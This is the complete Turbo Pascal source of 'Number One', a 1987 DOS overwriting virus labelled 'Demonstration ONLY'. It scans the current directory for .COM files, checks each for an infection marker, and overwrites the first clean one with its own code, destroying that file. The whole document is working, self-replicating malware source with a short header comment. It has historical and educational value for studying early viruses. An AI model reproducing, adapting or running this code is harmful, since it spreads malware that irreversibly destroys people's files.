﻿

{
 -----------------------------------------------------------------------

 Number One

 This is a very primitive computer virus.

 HANDLE WITH CARE!	--- Demonstration ONLY!

	Number One infects all .COM - files in the CURRENT directory.
	A warning message and the infected file's name will be displayed.
	That file has been overwritten with Number One's program code
	and is not reconstructable!

	If all files are infected or no .COM - files found,
	Number One gives you a <smile>.	Files may be protected
	against infections of Number One by setting the
	READ ONLY attribute.

 Written 10.3.1987 by M. Vallen (Turbo Pascal 3.01A)
  (C) 1987 by BrainLab

 -----------------------------------------------------------------------
}

{C-}
{U-}
{I-}	       { Do not allow a user break, enable IO check }

{ -- Constants -------------------------------------------- }

Const
	VirusSize = 12027; 	   { Number One's code size }

	Warning  : String[42]		  { Warning message }
	 = 'This file has been infected by Number One!';

{ -- Type declarations ------------------------------------ }

Type
	DTARec    = Record      { Data area for file search }
	DOSnext : Array[1..21] of Byte;
		    Attr    : Byte;
		    Ftime,
		    FDate,
		    FLsize,
		    FHsize  : Integer;
		    FullName: Array[1..13] of Char;
		End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }

{ -- Program code------------------------------------------ }

Begin
	Writeln(Warning); 								{Display warning message }
  GetDir(0, UsePath);               { get current directory }
  if Pos('\', UsePath) <> UsePathLenght then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';        { Define search mask }
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  If not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 Then
	Delete(UsePath, B, 255); 	   { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then	 { If not IO error then ... }
      Begin
	BlockRead(Go, Buffer, 2);
	Move(Buffer[$80], TestID, 43);
			    { Test if file already infected }
	If TestID <> Warning Then 	 { If not, then ... }
	Begin
	  Seek (Go, 0);
			     { Mark file as infected and .. }
	  MarkInfected := Warning;
						{ Infect it }
	  BlockWrite(Go, ProgramStart, Succ(VirusSize shr 7));
	  Close(Go);
														 { Say what has been done }
	  Writeln(UsePath + ' infected.');
	  Halt;                  { ... and HALT the program }
	End;
	Close(Go);
      End;
	 { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
	 {  ......................Until no more files found }
    Until Odd(Reg.Flags);
  Write('<smile>');			     { Give a smile }
End.
</smile></smile>